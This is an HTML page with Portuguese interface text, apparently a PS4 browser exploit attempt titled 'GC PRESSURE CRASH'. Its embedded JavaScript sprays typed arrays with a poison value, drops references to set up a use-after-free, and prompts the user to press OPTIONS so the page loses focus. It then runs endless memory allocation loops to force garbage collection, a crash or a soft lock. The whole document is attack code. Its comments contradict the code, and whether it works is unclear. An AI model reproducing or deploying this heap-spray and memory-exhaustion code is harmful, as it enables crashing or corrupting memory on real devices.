
<!DOCTYPE html>
<html>
<head>
    <title>PS4 GC PRESSURE CRASH</title>
    <style>
        body { background-color: #200; color: #fff; font-family: monospace; text-align: center; overflow: hidden; }
        iframe { width: 90%; height: 350px; border: 4px solid #fa0; background: #000; margin: 10px auto; display: block;}
        button { padding: 20px 40px; font-size: 1.5em; cursor: pointer; background: #e60; color: black; border: 2px solid #fff; font-weight: bold; }
        #log { text-align: left; margin: 20px auto; width: 90%; border: 1px solid #555; padding: 10px; background: #111; color: #fa0; }
    </style>
</head>
<body>

<h1>GC PRESSURE CRASH</h1>
<h3>Técnica: Esgotamento de RAM para forçar Varredura de Heap</h3>

<iframe id="trigger_frame" srcdoc="
    <html>
    <body style='background:#111; color:#fa0; text-align:center'>
        <h3>ZONA DE PRESSÃO</h3>
        <button onclick='startSequence()' style='padding:15px; background:#e60; color:black; font-weight:bold; border:2px solid white;'>
            INICIAR OOM (Out Of Memory)
        </button>
        <div id='status'>Pronto.</div>
        
        <script>
            var victims = [];
            var spray = [];
            
            // Setup padrão
            const COUNT = 10000;
            const POISON = 2.121995791e-314; // 0x4141...

            function startSequence() {
                document.getElementById('status').innerText = '1. Preparando Heap...';
                
                for(let i=0; i<COUNT; i++) {
                    let v = new Float64Array(16);
                    v.fill(1.1);
                    victims.push(v);
                }

                document.getElementById('status').innerText = '2. APERTE OPTIONS AGORA!';
                
                // Fullscreen Trigger
                var el = document.documentElement;
                var rfs = el.webkitRequestFullscreen || el.requestFullscreen;
                rfs.call(el);

                window.onblur = function() {
                    // 3. O ATAQUE (UAF)
                    victims = null; 
                    
                    // Spray
                    for(let i=0; i<COUNT*2; i++) {
                        let s = new Float64Array(24);
                        s.fill(POISON);
                        spray.push(s);
                    }

                    document.getElementById('status').innerText = '3. ENCHENDO A RAM (CRASH IMINENTE)...';
                    
                    // 4. A BOMBA DE MEMÓRIA (Force GC)
                    // Não usamos setTimeout. Queremos travar a thread principal.
                    
                    setTimeout(function() {
                        var pressure = [];
                        var i = 0;
                        try {
                            // Loop Infinito de Alocação
                            // Tenta alocar blocos de 10MB até estourar a memória do PS4
                            while(true) {
                                // ArrayBuffer é alocado fora do Heap V8, pressiona o sistema direto
                                pressure.push(new ArrayBuffer(1024 * 1024 * 10)); 
                                i++;
                                if(i % 10 == 0) document.getElementById('status').innerText = 'Alocados: ' + (i*10) + 'MB';
                            }
                        } catch(e) {
                            // Se chegar aqui, o GC rodou e sobrevivemos (ruim)
                            // Então tentamos alocar Arrays JS
                            document.getElementById('status').innerText = 'Modo 2: JS Heap flooding...';
                            var jsFlood = [];
                            while(true) { jsFlood.push(new Float64Array(100000)); }
                        }
                    }, 50);
                };
            }
        </script>
    </body>
    </html>
"></iframe>

<div id="log">Logs do Sistema...</div>

<script>
    // Se o console não responder em 10 segundos, é sinal de sucesso
    let counter = 0;
    setInterval(function(){
        counter++;
        document.getElementById('log').innerText = '>> Tempo decorrido: ' + counter + 's (Se parar, deu Soft Lock ou Crash)';
    }, 1000);
</script>

</body>
</html>
